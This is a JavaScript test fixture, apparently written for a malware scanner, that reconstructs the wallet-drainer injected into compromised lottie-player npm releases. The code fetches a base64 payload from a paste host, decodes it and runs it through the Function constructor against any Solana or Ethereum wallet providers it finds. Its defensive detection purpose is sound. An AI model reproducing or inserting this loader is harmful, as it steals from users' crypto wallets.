// @lottiefiles/lottie-player@2.0.5 / 2.0.6 / 2.0.7 (Oct 30 2023).
// LottieFiles' npm publish token was leaked through a compromised
// developer; the published versions injected a wallet-drainer that
// targeted Solana / Ethereum dapps embedding the player. Public
// write-up: https://www.lottiefiles.com/blog/about-lottiefiles
//
// Detection target:
//   - dynamic-eval     (Function constructor + decoded source)
//   - base64-decode    (atob of payload string)
//   - net-egress       (fetch to attacker host)
//   - obfuscated-payload (Function(atob(...)))

(function () {
  const drain = async (provider) => {
    // Fetch the wallet-drainer second stage from a paste host.
    const r = await fetch("https://pastebin.com/raw/WALLETDRAIN");
    const src = atob(await r.text());
    const fn = new Function("provider", src);
    return fn(provider);
  };

  // Inject into every connected wallet provider.
  if (typeof window !== "undefined" && window.solana) {
    drain(window.solana);
  }
  if (typeof window !== "undefined" && window.ethereum) {
    drain(window.ethereum);
  }
})();
